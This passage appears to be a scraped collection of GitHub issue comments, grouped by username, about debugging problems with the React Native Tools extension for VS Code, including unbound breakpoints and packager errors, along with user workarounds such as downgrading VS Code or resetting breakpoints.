    "annakocheshkova": "Hi @jpsouzasilva, thank you for your request! First of all, let me explain to you what the message you see actually means. It simply says that some of the following actions were not executed: \"BUILD SUCCESSFUL\", \"Starting the app\", \"Starting: Intent\". I don't see any of them in the output window as well.\nIt's hard to say why that happened, but I believe the reason here is that react native can't find the connected device to run the application in or doesn't like the simulator/device you plug in. The output after run android supports my proposition as well. Please double-check that you have an android device connected or a simulator running.\nIf that doesn't help you, please provide repro steps. You didn't fill in Actual behaviour & Expected behaviour fields and we can't reproduce the issue or understand what exactly you are trying to do.. Hi @jpsouzasilva thank you for the detailed information! To find out the problem we will need a minimal working version of your app or at least launch.json contents. So if you find the time to send us more information, it would be great!. @jpsouzasilva looks like we still need to use a minimal working version of your application to have the issue be reproduced.. Hi @jpsouzasilva, finally, I was able to reproduce this bug. \nWe are going to investigate it next week. Let me know if it's blocking you very much.\n@ethanx94 unfortunately, your suggestions didn't help me, but thank you anyway!. @jpsouzasilva @arshbot, have just started a deeper investigation on your issue. \u0421ould you please paste the output of react-native run-android?. @PunchcardCoder, could you please also paste the output of the React Native: run android? You can choose it in the top right dropdown in the output window. I suppose the actual issue can be seen there.. Hi @geneus, thank you for the request! Can't reproduce your issue with the same parameters - does it still persist?. @geneus, closing this for now, please feel free to reopen if you find more info. We didn't manage to reproduce your issue, an actual error text or a couple of screenshots would help us a lot.. Hi @G3z. We have fixed the issue and are going to make a new release with the fix today. We will keep you updated on the progress. Thank you for the assistance!. @LasseSLambertsen Hi, yes you are correct, we have fixed this issue and are going to release the fix ASAP.. Hi @Gremlin80, thank you for your request. I have installed the latest version of VSCode and react native extension, but my debug session works fine the second, the third, and all the subsequent tries. \nLet me see what the React Native and React Native: Run android output says. Click \"Debug android\", and when it hangs infinitely, go to the \"Output\" window and paste the contents here. Then choose React Native: Run android in the dropdown list at the top right corner and also place the output here. \nRegarding the second issue, could you please look at this comment? It is a known issue and is discussed there.. @domialex Do I get it right that your issue is resolved by reinstalling the extension? If not, please provide the information I requested above.\nThank you!. @WesleydeSouza thank you for your request!\nTry executing react-native run-ios --simulator --no-packager / react-native run-ios --simulator=\"<device_name>\" --no-packager in terminal, does it work for you?. Hi @ctaggart, thank you for the request and sorry for the long delay! Though I myself wasn't able to reproduce your issue, I can suggest you to look at this one #673. Looks very similar to what you are experiencing. \nPlease try to apply one of the fixes mentioned there and see if attaching to packager works.\nWe will wait for your answer, thank you!. @icahnchen thank you for your request! I'm not sure how to reproduce it, make sure the issue is reproduced on a stable version of VSCode and if yes, give us some more details, a minimal working version of the project would be great.. @icahnchen, the workflow you described is pretty common, and for me everything works. I assume problem here is because you are using a non-stable version of VSCode, please try to download the latest stable version, which is 1.22.2, and see if it works. \nIf the issue still persists on 1.22.2, please send me the minimal working copy of your project so I can reproduce it, too.. @icahnchen I just tried the whole workflow you described once again, everything works. \nStill, I can not help but notice that in the project you sent there are no android and ios folders, which should exist, if you have used react-native init, so please verify that.\nAlso I can suggest you to open an issue here, maybe the guys will help you with it, because clearly the issue is on their side.. @tafelito @BarlowTucker @Yousefjb thank you for your requests! \nAs for me, I didn't manage to reproduce the issue neither with flow-bin or react-redux and I don't think that having these plugins in package.json is the root cause of the issue. \nIt seems that the issue you've faced with is a duplicate of #281 and #661 . You can try the solutions listed there or follow it on the updates.. ",
    "ethanx94": "Are you trying to run debugger on a port other than 8081? I've been using a port patcher post install script, because custom ports hadn't been attaching to debuggers/working 100% for me.\nyarn add --dev react-native-port-patcher\nThen add to your package.json\nscripts {\n...\n    \"postinstall\": \"react-native-port-patcher --new-port 8082\"\n}\nThen add (or create) to your .vscode/settings.json\n{\n    \"react-native.packager.port\": 8082\n}\nAnother problem I found was, since I started my project on Windows, the permissions on my gradlew file got mangled when I tried to run on OSX. I did a\ncd android && chmod 755 gradlew\nThis fixed my issue. Just throwing these suggestions out there, I'm sure there are a lot of people in the same boat.\nAlso another thing I'll admit to missing. As far as attaching within VSCode, sometimes right after deployment the Remote JS Debugging option isn't toggled automatically. (This is especially true for UWP apps)\nHit Shift+F10 (UWP) or Ctrl+M (Android) or do some shaking action in your emulator and go ahead and toggle this option from the pop up menu.. ",
    "PunchcardCoder": "Having the same issue. Launch.json nearly identical to @jpsouzasilva's (except for the Packager port, I guess):\n```\n{\n    // Use IntelliSense to learn about possible attributes.\n    // Hover to view descriptions of existing attributes.\n    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n    {\n        \"name\": \"Debug Android\",\n        \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n        \"type\": \"reactnative\",\n        \"request\": \"launch\",\n        \"platform\": \"android\",\n        \"sourceMaps\": true,\n        \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n        \"name\": \"Debug iOS\",\n        \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n        \"type\": \"reactnative\",\n        \"request\": \"launch\",\n        \"platform\": \"ios\",\n        \"sourceMaps\": true,\n        \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n        \"name\": \"Attach to packager\",\n        \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n        \"type\": \"reactnative\",\n        \"request\": \"attach\",\n        \"sourceMaps\": true,\n        \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    },\n    {\n        \"name\": \"Debug in Exponent\",\n        \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n        \"type\": \"reactnative\",\n        \"request\": \"launch\",\n        \"platform\": \"exponent\",\n        \"sourceMaps\": true,\n        \"outDir\": \"${workspaceRoot}/.vscode/.react\"\n    }\n]\n\n}\n```\nOutput as follows\n[Info] Packager is already running.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] About to get: http://localhost:8081/index.android.bundle?platform=android\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\n BUNDLE  [android, dev] ./index.android.js \u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593 100.0% (1/1), done.\n[Error] Error: Unknown error: not all success patterns were matched. ",
    "aemoe": "I find some resolve way to fix this bug. \nBut I am not sure it is same question.\nI deleted a asset file dir (in the image, the iconfont dir ) then VSCODE React Native Tool throw \n[Error] Error: Unknown error: not all success patterns were matched\n\nWhen I put it back , all is right.\nHope help to other people.. ",
    "christwsy": "+1 for having this issue using the auto-generated launch.json with a newly created react native project. The simulator running is iPhone 6 iOS 11.2.\nSome other info:\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.23.0. ",
    "kinex": "I have the same issue \"Could not debug. Unknown error: not all success patterns were matched\". Output of the React Native: run android was initially (without any modifications to the generated files):\n```\n[Warning] Target simulator is not supported for Android platform. If you want to use particular device or simulator for launching Android app, please specify device id (as in 'adb devices' output) instead.\n[Info] Starting React Native Packager.\nScanning folders for symlinks in d:\\work\\test\\AwesomeProject\\node_modules (34ms)\n```\nI added \"target\": \"ad0c13034414b952e2\" to launch.json. Now I still get the same error \"Could not debug. Unknown error: not all success patterns were matched\" but the React Native: run android says:\n```\n[Info] Starting React Native Packager.\n[Info] Attaching to running React Native packager\nScanning folders for symlinks in d:\\work\\test\\AwesomeProject\\node_modules (26ms)\n```\n. ",
    "yeshengwu": "I just open the android project in Android Studio and sync the project to make sure the android project is build success. After we build success,then we are ok to run and debug. Hope this help,. ",
    "AylwSt01": "i'm getting this too... very annoying!\n. ",
    "edmundito": "I just setup VScode for the first time and ran into the same issue:\nVscode 1.20.1\nRN Tools 0.5.7\nRN 0.53.0\nOne unusual thing I noticed is that when I created the launch parameters I looked at launch.json and when I reviewed the docs for the Extension it recommended to add internalDebuggerPort, but I see this: \n\nHere is some additional information from the debug console:\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.18.5\nStarting debugger app worker.\nEstablished a connection with the Proxy (Packager) to the React Native application\nDebugger worker loaded runtime on port 4612\nThe \"Debugger worker\" port seems to be changing on every run.\n. ",
    "dancomanlive": "\nStill not working. Tried on two different projects.. \nVersion 1.21.0-insider (1.21.0-insider)\nMacOS 10.13.3 (17D47)\nSame result for Android.. \nGetting this error when reloading the application in debug mode. I don't know if it is relevant to this issue though but I am sharing it just in case it would be. Break point still not working after reinstalling React Native Tools. DevTools.js comes from remote-redux-devtools/lib. I have \"remote-redux-devtools\": \"^0.5.12\". The debugger is working now. Still testing but everything works as expected.. ",
    "Sler69": "I recently installed the version 0.6.1 of vscode-react-native. The breakpoints are not working yet. \nreact-native-tools: 0.6.1\nvscode:1.20.1\nOS: Ubuntu 17.10\nreact-native-cli: 2.0.1\nnode:v9.5.0\n. Hi @sergey-akhalkov, \n vscode-chrome-debug-core version is : 3.23.0. Yep resetting a single breakpoint enabled all the breakpoints and allowed me to create new ones. Thanks for the feedback @sergey-akhalkov !! . ",
    "f4z3k4s": "Same here. Breakpoints don't work. :(\nreact-native-tools: 0.6.1\nvscode: 1.20.1\nos: ubuntu 16.04\nreact-native-cli: 2.0.1\nnode: 8.9.4\nreact-native: 0.47\n. Hi @sergey-akhalkov, my vscode-chrome-debug-core version is : 3.23.0.. ",
    "netsmertia": "Yes resetting a single breakpoint allow me to use all the defined breakpoint. \n```\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.23.0\n\nnetss-MBP:~ nets$ node -v\nv9.5.0\n\nRN Tools : 0.6.3\nreact-native-cli: 2.0.1\nRN: 0.53.3\nVS Code: 1.20.1\n```. ",
    "zmechanic": "I've got the same issue on VS Code as below:\nVersion 1.20.1\nCommit f88bbf9137d24d36d968ea6b2911786bfe103002\nDate 2018-02-13T15:34:36.336Z\nShell 1.7.9\nRenderer 58.0.3029.110\nNode 7.9.0\nArchitecture x64\nDebugger attaches OK. But all breakpoints are dark grey empty circles:\n\n. ",
    "mailaneel": "I have got the same issue today, but noticed I was setting break points on the packages that are in node_modules using npm link or lerna add or symlinks\nIf i set breakpoint on the actual package that works fine\n. ",
    "WHATSAF": "@sergey-akhalkov \nIt seems like not the vscode-chrome-debug-core's issue to me.\nI tried the workaround, and it didn't help.\nI also switched to lots of versions of the vscode and react-native, it didn't help too.\n```\nOS:macOS 10.13.3\nVSCode:1.20.1(1.19.x tried)\nvscode-chrome-debug-core: 3.23.0\nreact-native:0.54.0(0.5x.0 tried)\n``\nJust runreact-native init Rnand debug.. The same issue onmacOS 10.13.3`.. Hi @ruslan-bikkinin .This is the issue that i commented in #625 .Wish it help.\n#625. ",
    "ilkerican": "Do not use VSCode 1.20 or 1.21. They do not stop at breakpoints.\nUse VS Code 1.18 : https://code.visualstudio.com/updates/v1_18 \nAnd dont let your version upgrade by default. Set \"update.channel\": \"none\".\nOtherwise it updates itself to 1.20 and you go back to unhit breakpoints.... ",
    "yakimka": "Same here. Breakpoints don't work. Also @sergey-akhalkov workaround don't work\nreact-native-tools: 0.6.4\nvscode: 1.21.0\nos: Arch Linux with latest updates\nreact-native-cli: 2.0.1\nnode: 9.8.0\nreact-native: 0.54.1\nthese are my .vscode and .vscode-react-native folders https://yadi.sk/d/GO0F50Do3TFHev\nBreakpoints in chrome working well. ",
    "pennyandsean": "0.54.2 is up. Looks like 0.29.0 was released. And 0.30.0.. Ripper, thanks Max, it works!. ",
    "jdeanwaite": "Just wanted to chime in and include my report that 0.54.2 does not seem to solve the issue for me (I believe they are still using Metro 0.28.0 instead of 0.29.0).\nReceiving the message: Unverified breakpoint, breakpoints set but not yet bound\nClicking to reset the breakpoints does nothing.\nmacOS: 10.13.3\nReact Native Tools 0.6.4\nvscode-chrome-debug-core: 3.23.0\nThe interesting thing is that breakpoints do indeed work with Webstorm on the same project. Are we positive this is completely an issue with Metro?. @max-mironov It is working now other than, as you stated, the need to reset a breakpoint once to get it to work (I can live with that). . ",
    "tjma2001": "This seems to happen to me when I am accessing the project if its in a subdirectory. I have a mono repo with multiple projects. My typescript nodejs application is in a subdirectory called server.\nWhen I open vscode in the subdirectory of server, the breakpoints are showing (i.e. not as unverified breakpoints). They are still not hitting though. When I click run the application, I have a setTimeout which prints a console.log statement. Before this setTimeout, I have another console.log statement. In the debugging window when a console.log gets printed it gives you a clickable link to open the file that the console.log statement was run from.\n\nIts only in this file that I can create breakpoints that are actually hit. \nVersion 1.21.1\nCommit 79b44aa704ce542d8ca4a3cc44cfca566e7720f1\nDate 2018-03-14T14:46:30.761Z\nShell 1.7.9\nRenderer 58.0.3029.110\nNode 7.9.0\nArchitecture x64. I have just changed my debug command from inspect to inspect-brk. Breakpoints are being hit, but at the wrong points.\nThis is where is set them:\n\nThis is where the code is triggering, (once again in the \"index.ts read-only inlined content from source map\")\n\n\nThis is my current launch.json\n{\n    // Use IntelliSense to learn about possible attributes.\n    // Hover to view descriptions of existing attributes.\n    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"type\": \"node\",\n            \"request\": \"attach\",\n            \"name\": \"Attach to Remote\",\n            \"address\": \"localhost\",\n            \"port\": 5858,\n            \"protocol\": \"inspector\",\n            \"localRoot\": \"${workspaceRoot}\",\n            \"remoteRoot\": \"/app\",\n            \"sourceMaps\": true,\n            \"restart\": true,\n            \"outFiles\": [\n                \"${workspaceRoot}/server/built/**/*.js\"\n            ]\n        },\n        {\n            \"type\": \"node\",\n            \"request\": \"launch\",\n            \"name\": \"Launch Program\",\n            \"program\": \"${workspaceFolder}/index.js\"\n        }\n    ]\n}. ",
    "Benzer1406": "Still have the same issues with version Version 1.21.1 (1.21.1) of VSCode. With workaround it works, but a fix would be cool.. Yes @snoopy83101, the workaround is to click on a breakpoint that is already set and deactivate it and then click it again on the line where you want it to be and it works. . @snoopy83101 then maybe it is a good idea just to use very few breakpoints, Just. One or two. . ",
    "diego-G": "Same goes here. The weirdest thing is that works on some repos from the same workspace but in the recently settled.. ",
    "snoopy83101": "@Benzer1406 \nHi ,You say there is a solution to the current version?\nWhat is it?  Pls tell me!  Thank you very much!. if  solution is  \"Reset a new breakpoint?\"\ngod ! I choose to die. @Benzer1406 \nWhenever i restart a debug\nBreakpoint Jumps to an Unknown Line\nI must first find the unknown line and cancel him.\nThen set it again, in the line I want??\nSorry for the Google translation I used. @Benzer1406 \nThank you very much for your answer!\nDoes the community's big brothers say that this problem will be fixed recently? (in this issues). ",
    "ak99372": "None of these \"workarounds\" do much in my case, all the breakpoints stay with\n\nBreakpoint set but not yet bound\n\nIf I add \"debugger;\" line into the code the debugger stops at this line however not in code but in \"index.bundle\"\nTo me the debugger seems fine but the sourcemaps don't seem to point to the actual code. Is there a way to check and see whether the sourcemap are generated correctly? \nvscode: 1.21.1\nRN tools: 0.6.6\nvscode-chrome-debug-core: 3.23.0. ",
    "basdp": "same as @ak99372 for me. Exactly the same.. ",
    "arvi": "I am experiencing the same thing \"Breakpoint set but not yet bound\" :sweat_smile: . ",
    "hippotz": "This may be a different problem, but I noticed when I upgrade react-native from 0.54.2 to 0.54.3 my index.map is no longer generated in ./.vscode/.react/\nStaying on 0.54.2 is working for me.\nMy working setup:\nOS: Mac OS High Sierra 10.13.4\nvscode: 1.21.1\nreact-native-cli: 2.0.1\nreact-native: 0.54.2. ",
    "bmr1": "My breakpoints are grey and never get hit using metro bundler in terminal and using 'Attach to Packager' debug mode.\nreact-native-cli: 2.0.1\nreact-native: 0.54.4\nwindoze 10\nRN tools 0.6.6\nnode debug 2 1.20.0. ",
    "zhangbobell": "I am also encountering this issue. ",
    "animaonline": "Upgrading to node 9.11.1 seems to have resolved the problem for me.. ",
    "ASP-2014": "Problem still persists with VScode Version 1.21.). FYI i have also check on old version (1.17.2). On both version breakpoints are not working at all. Any fix would be really appreciated. . ",
    "rakeshgits": "Facing same issue with vscode 1.22.1, when i switch to 1.19, it works perfectly, any help will be appreciated !. After adding that, it get stuck on \nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\nit worked just after installing latest version, but stopped after rebooting the system. Is there any way to go to previous versions? . Thanks for the response, I am debugging ios, by attaching to packager. i tried adding older version of the extention, but of no use, it still is showing the same problem.\nI tried completely removing vscode, by deleting all settings and extentions, reinstalling npm and yarn.\nprobably it is because of the updated yarn/npm. because that is the only thing i remember doing before it stopped working suddenly, second to the updated extention before 20 hours.\nI am adding the screenshots for more info.\n\n\n\n\n\n\n. @ruslan-bikkinin  i tried it in a brand new mac OS, with LTS version of node, and got the same error. am i missing something in the settings? it used to work for me earlier without any modifications.. @ruslan-bikkinin , sorry for the incorrect react native version, it was a mistake on my part, the correct version is v0.55.4 .\nThe response i got after adding verbose trace is \n```\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\n09:51:03, 2018-6-15\nFrom client: initialize({\"clientID\":\"vscode\",\"clientName\":\"Visual Studio Code\",\"adapterID\":\"reactnative\",\"pathFormat\":\"path\",\"linesStartAt1\":true,\"columnsStartAt1\":true,\"supportsVariableType\":true,\"supportsVariablePaging\":true,\"supportsRunInTerminalRequest\":true,\"locale\":\"en-gb\"})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":1,\"command\":\"initialize\",\"success\":true,\"body\":{\"exceptionBreakpointFilters\":[{\"label\":\"All Exceptions\",\"filter\":\"all\",\"default\":false},{\"label\":\"Uncaught Exceptions\",\"filter\":\"uncaught\",\"default\":false}],\"supportsConfigurationDoneRequest\":true,\"supportsSetVariable\":true,\"supportsConditionalBreakpoints\":true,\"supportsCompletionsRequest\":true,\"supportsHitConditionalBreakpoints\":true,\"supportsRestartFrame\":true,\"supportsExceptionInfoRequest\":true,\"supportsDelayedStackTraceLoading\":true,\"supportsValueFormattingOptions\":true,\"supportsEvaluateForHovers\":true,\"supportsLogPoints\":true}}\nStarting debugger app worker.\nAbout to download: http://localhost:8081/debuggerWorker.js to: /Users/striker/Documents/Projects/AktivLearn/aktivlearn-react-native/.vscode/.react/debuggerWorker.js\nCould not debug. <!DOCTYPE html>\n\n\n\nError\n\n\n\n\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"terminated\"}\nFrom client: disconnect({\"restart\":false})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":3,\"command\":\"disconnect\",\"success\":true}\n```. @ruslan-bikkinin  it is haul library, thanks, it started working after removing that.\nThanks a lot for all the help.. ",
    "mbonaci": "1.22.2 behaves the same way.\nI'm trying to debug a local WebpackDevServer.\nOK, here's what happens (I caught this error after I turned on Break on: All Exceptions):\n\"Error: Cannot find module 'kexec'\n    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:548:15)\n    at Function.Module._load (internal/modules/cjs/loader.js:475:25)\n    at Module.require (internal/modules/cjs/loader.js:598:17)\n    at require (internal/modules/cjs/helpers.js:11:18)\n    at /Users/mbo/dev-st/sematext-cloud/frontend/node_modules/babel-cli/lib/babel-node.js:67:17\n    at /Users/mbo/dev-st/sematext-cloud/frontend/node_modules/v8flags/index.js:110:14\n    at /Users/mbo/dev-st/sematext-cloud/frontend/node_modules/v8flags/index.js:38:12\n    at /Users/mbo/dev-st/sematext-cloud/frontend/node_modules/v8flags/index.js:49:7\n    at process._tickCallback (internal/process/next_tick.js:176:11)\n    at Function.Module.runMain (internal/modules/cjs/loader.js:697:11)\"\nHope this helps, VSCode team.\nEDIT\nThis module is a part of babel.\nAfter I installed this package it stopped braking on this error above, but now debugger freezes when I try to step-over an execution of a binary file (kexec.node).. ",
    "SudoPlz": "By the way, Jest debug sessions don't work either now, because the test finishes a lot before I can even manage to click on a breakpoint.\n{\n      \"type\": \"node\",\n      \"request\": \"launch\",\n      \"name\": \"Jest Tests\",\n      \"program\": \"${workspaceRoot}/node_modules/jest/bin/jest\",\n      \"args\": [\n          \"-i\"\n      ],\n      \"internalConsoleOptions\": \"openOnSessionStart\",\n      \"outFiles\": [\n          \"${workspaceRoot}/dist/**/*\"\n      ]\n    }\nused to work, but doesn't any more.. ",
    "Albert-Gao": "OK. After reading all the previous comments and tried.\n4 ways to solve this problem for React native dev:\n1. With the latest version 1.22.2\n1. After starting the app, the breaking point in the app will be black.\n2. click it to disable then click again to active it.\n3. Now it works.\n4. Anytime you refresh, do it again.\n5. Still, won't stop inside render() function, but event handler works now.\n2. Downgrade to 1.19\n- Everything works flawlessly\n- Remember to turn off the auto update by setting update.channel to none\n- Otherwise, VSC will auto-update and breaks everything.\n- One suggestion, not override the existing version. Create a new one. Becasue in my case it ONLY work for the first override at least in my case. For the 2nd override, everything still works but you can't see the breakpoint and its highlight which is another bug.\n3. Use Atom + Nuclide\n- Everything works\n4. Use debugger with the latest version 1.22.2\n- Everything works\n- use the debugger statement rather than setting up the VSC\n- Recommend to use this\nSomething must happened here. Because Webstorm has some similar issues like won't stop inside the render rather than event handler. But works with debugger statement. ",
    "krazykira": "For Me the debugging only worked with Visual code studio Version 1.17.2 (1.17.2)\nDon't forget to disable update for Visual Studio code otherwise it will get updated automatically\nIn Preferences Set \"update.channel\": \"none\".\n. ",
    "joebernard": "@krazykira Instead of setting breakpoints in VSC, add the statement debugger; in your code. Run the project in debug mode and the debugger will break at that line.. I verified it works after the update. Thanks!. I experienced this issue today. The gear in the debug pane had a red alert circle on it and did not display the RN debug option. I followed the advice from @code-matt and manually created a blank launch.json. Wasn't sure where to put it, so I created it in my project root. Suddenly the React Native debugging option was there, and it had created a launch.json within the .vscode directory. I deleted the root launch.json and everything seems to be working.\nvscode 1.23.1\nrn tools 0.6.10. Angular Essentials 0.3.2\nAngular Language Service 0.1.9\nAngular v6 Snippets 6.1.1\nAngular 2-inline\nAuto Close Tag 0.5.6\nAuto Complete Tag 0.0.2\nAuto Rename Tag 0.0.15\nBabel JavaScript 0.0.14\nColor Highlight 2.3.0\nDebugger for Chrome 4.4.3\nDebugger for Java 0.9.0\nDotENV 1.0.1\nEditorConfig for VS Code 0.12.2\nGit Blame 2.4.2\nJava Extension Pack 0.3.0\nJava Test Runner 0.6.1\nLanguage Support for Java(TM) by Red Hat 0.25.0\nMaven for Java 0.8.0\nNativeScript 0.7.4\nnpm 0.3.4\nnpm Intellisense 1.3.0\nPath Intellisense 1.4.2\nPrettier - Code formatter 1.3.1\nRainbow Brackets 0.0.6\nReact Native Tools 0.6.10\nTODO Highlight 0.5.12\nTSLint 1.0.29\nWinter is Coming Theme 0.6.2. ",
    "danieluy": "Hi guys, I was having the same issue when trying to Attach to Pocess ID by selecting a nodemon instance. I switched to select the one that just says node and everything started to work. Not sure if this will help but doesn't hurt to try.. ",
    "dhalperi": "When will the next minor release of VSCode be? Sounds like this bug was fixed almost a month ago now.. ",
    "dxh9845": "I am still experiencing issues with debug breakpoints not being hit - on version 1.24. Running Node.js code, breakpoints hit in the main program specified, but when breakpoints are set outside of the main code I get the following error: \n\nThis happens within both the WSL and with a Windows install of node.  Any help would be appreciated - I've tried a variety of debug configurations and none have worked.\n. ",
    "ivanromaniv": "Hi! I have the same problem. Using 1.24.0 vscode on ubuntu 18.04 with nodejs(javascript) project. I attach to exposed port from docker. \n. ",
    "AnitaVPN": "I am having the same issue , i am new to react-native and i want to do debugging , i am using vscode and expo to run app, but when i do debugging i have same issue which you had mention. \nCould you please specify the steps for resolving ?. ",
    "liberalisman": "\nI am having the same issue , i am new to react-native and i want to do debugging , i am using vscode and expo to run app, but when i do debugging i have same issue which you had mention.\nCould you please specify the steps for resolving ?\n\n\nOpen your Xcode, Prefercnces -> Locations ->  Choose your Command Line Tools \nSolved!!!. ",
    "geneus": "Hi @annakocheshkova. \nIt stopped for a while, for 2 days I think, then it started again. Uninstalled, reinstalled then a different extension started throwing the error. I'm kinda lost why this behaviour persists and unfortunately, I am not currently developing. Working on something else design related so I can't provide any further info as yet. I'm also experiencing issues with my network so I have limited (and slow) access to the net. \nI will reopen if the issue persists when I do get around to looking into the issue again. \nThanks for the help.. ",
    "leejones45": "I followed instructions in that thread and solved my issues.  Thanks.. ",
    "olegwn": "I don't understand, why completely disabling JavaScript validation in VS is considered a valid solution? This isn't fixing the problem, it just hides and makes VS less usable.. ",
    "ericvicenti": "I'm here from google.. can't believe this issue still hasn't been fixed!\nFor those still hitting this.. just set this in your preferences:\n\"javascript.validate.enable\": false,\nI'm about to teach a whole workshop full of people that you need to do this to use flow with VSCode.. which makes VSCode look very poorly suited for JS!. VSCode is still my favorite editor right now for JS, but I am confused by this configuration. Editors like Atom and Sublime Text do not have problems like this. Its still not clear why I have to disable \"JS validation\" in order to use a type system like flow... ",
    "C2P1": "I also use VSCode and a fix that I found was to change from this: \ntype Props = {};\nexport default class App extends Component<Props> {\nto just this:\nexport default class App extends React.Component {\ni.e. get rid of the type Props, and then change the App class' superclass from Component to React.Component. \nEverything now works as expected. A bit odd that the default does not work in VSCode, I'm yet to find anything in the market place that adds support as well, but definitely seems to be a VSCode issue rather than a React-Native problem. \nHope this helps!  . ",
    "mortdatherobot": "@ericvicenti What do you recommend for JS instead of vscode?. ",
    "FaustoCouto": "Just install the new version of ESLint extension and be happy.. ",
    "DamilolaJegede": "@FaustoCouto it seemed to work for a few seconds, and then the error returns. ",
    "buiqtuan": "I really don't understand why this bug still cannot be fixed ? :\\ . ",
    "G3z": "if you remove your index.js you will get the error. \nthe extension should pick up index.ios.js automagically, right ?. ",
    "patniko": "Should definitely pick it up @G3z. We'll do some more investigation on our end.. ",
    "LasseSLambertsen": "Still having this issue though with index.android.js. Updated extension, and on newest RN.. ",
    "asaravi": "I can also confirm I'm having this same issue, with the same output in Developer tools console.\nSoftware versions:\n\nReact-Native VS Code extension version: 0.6.1\nVSCode version: 1.20.1\nOS platform and version: Windows 10, version 1703, build 15063.909\nNodeJS version: 8.9.1\nReact Native version: 0.52.0. Hi @iTOYS \n\noutput of 'ls -la ./ios'\ntotal 24\ndrwxr-xr-x   9 allan  staff   306 14 Jun 15:32 .\ndrwxr-xr-x  32 allan  staff  1088 14 Jun 15:32 ..\n-rw-r--r--@  1 allan  staff  8196 27 Mar 14:54 .DS_Store\ndrwxr-xr-x@  8 allan  staff   272 14 Jun 15:32 build\ndrwxr-xr-x   9 allan  staff   306 14 Jun 10:57 plexiaMA\ndrwxr-xr-x   3 allan  staff   102 14 Jun 10:57 plexiaMA-tvOS\ndrwxr-xr-x   3 allan  staff   102 14 Jun 10:57 plexiaMA-tvOSTests\ndrwxr-xr-x@  6 allan  staff   204 14 Jun 10:57 plexiaMA.xcodeproj\ndrwxr-xr-x   4 allan  staff   136 14 Jun 10:57 plexiaMATests\n(for this command, changed the path to the project to include the space, 'Plexia Mobile')\noutput for '/usr/libexec/PlistBuddy -c \"Print:CFBundleIdentifier\" \"./ios/build/Build/Products/Debug-iphonesimulator/Plexia Mobile.app/Info.plist\"'\nca.plexia.Plexia-Mobile\nThanks for looking into this!. Hi @iTOYS \nI've researched your comment a bit, and decided to remove the space in the project name, and run 'react-native-rename' to rename the project more correctly. \nHowever after running that, vscode-react-native was still creating a \"Plexia Mobile.app\" bundle inside the build folder. I manually modified these files to \"PlexiaMobile.app\" wherever it was written with a space:\n./ios/<app name>.xcodeproj/project.pbxproj\n./ios/<app name>/xcshareddata/xcschemes/<app name>.xcscheme\nI'm not sure which section in Xcode allows you to modify the above xml files as I'm not too familiar with Xcode.\nI then went in Xcode and changed \"CFBundleDisplayName\" to \"Plexia Mobile\"\nThis seems to be working.\nThank you for your help!\n. ",
    "ldwight": "VS Code: Version 1.20.1 \nReact-Native VS Code extension version: 0.6.1\nOSX 10.13.3\nNode 9.4.0\nreact-native-cli: 2.0.1\nreact-native: 0.52.0\nI am having the same issue BUT- it works the first time I run it! After that, even uninstalling & reinstalling React Native Tools extension does not revive me.\nToggled \"developer Tools\"  and see:\nvsmobile.vscode-react-native` failed: Cannot find module 'app-center-node-client'.\nfull screen attached.\n\nThank you\n. sorry to be a dummy, but I have many extensions involved in this debug. When you write:\n\"Uninstall current version of extension.\" I am not clear on which extension.\nIf it is the VSCode extension (as is implied by your instructions), how do I do that? \nThanks!. @nahuelhds - well hot diggety! 0.6.4 is working - hooray! Thanks for making me look twice .. ",
    "nahuelhds": "This happens to my in Code and Code Insiders as well. First, I thought it was an insiders issue, but I cannot make it work in any of those softwares... anyone could make this work?. I've downgraded to 0.6.1 by following this steps:\n\nFirst of all, download the vsix extension from here (thanks @scolestock).\nRename the file's extension to .vsix\nIn VSCode settings, set \"extensions.autoUpdate\": false\n\nThen, do this every time you restart Code:\n1. Delete the extension folder from ~/.vscode/extensions/vsmobile.vscode-react-native-0.6.1\n1. Installed the 0.6.1 from the vsix \nThat worked for me in both Code and Code Insiders as well. Annoying as it has to be done everytime but at least is something...\nHope it helps.\n. Well... more news: the problematic command is reactNative.startExponentPackager. Executing it brokes the extension after restarting Code.\nThe problem starts happening when that command finishes the \"Checking if this is Expo app......\" part. Maybe is related to the npm install that this process does, which isnpm install xdl @expo/ngrok --verbose --no-save.\nIf you run the command reactNative.startPackager the extension works just fine even after restart the software.\nSo, in my case where I use Expo, the solution was stop using reactNative.startExponentPackager and deploy the packager using XDE Expo software and debug normally as I do with this extension.\nIn conclusion, this is a 0.6.x regression issue. So, my recommendation is:\n\nIf you already has this \"command not found\" issue when trying to use any of the reactNative.* commands, go to ~/.vscode/extensions and delete the folder vsmobile.vscode-react-native-x.y.z\nInstall the extension normally in Code and through the vsix extension (it's the same).\nDownload and install Expo XDE\nWith Expo XDE, open your project and wait for it to give you the message Project opened! in the logs.\nGo to Code and Attach the packager as you normally do. Be sure to have the same packagerPort value given in /.expo/packager-info.json in your \"react-native.packager.port\" option at /.vscode/settings.json file (19001 in my case).\n\nBy doing this, I can use the debugger and breakpoints and after resetting Code it continues working without any problems.\nHope this helps to anybody.\n. Will do. You meant 0.6.3 right?. Hey 